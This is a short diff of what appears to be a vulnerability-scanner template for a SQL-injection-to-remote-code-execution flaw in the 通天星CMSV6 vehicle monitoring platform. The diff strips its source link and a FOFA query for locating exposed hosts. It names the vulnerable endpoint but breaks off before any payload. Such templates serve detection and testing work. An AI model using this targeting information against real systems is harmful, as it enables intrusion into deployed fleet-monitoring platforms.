@@ -3,12 +3,8 @@ info:
   name: 通天星CMSV6车载定位监控平台merge SQL注入致RCE
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uf33dzrq9bdnvdv5'
+  description: ''
   tags: rce,sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uf33dzrq9bdnvdv5
-    fofa: body="/808gps/"
 http:
 - raw:
   - 'POST /point_manage/merge HTTP/1.1
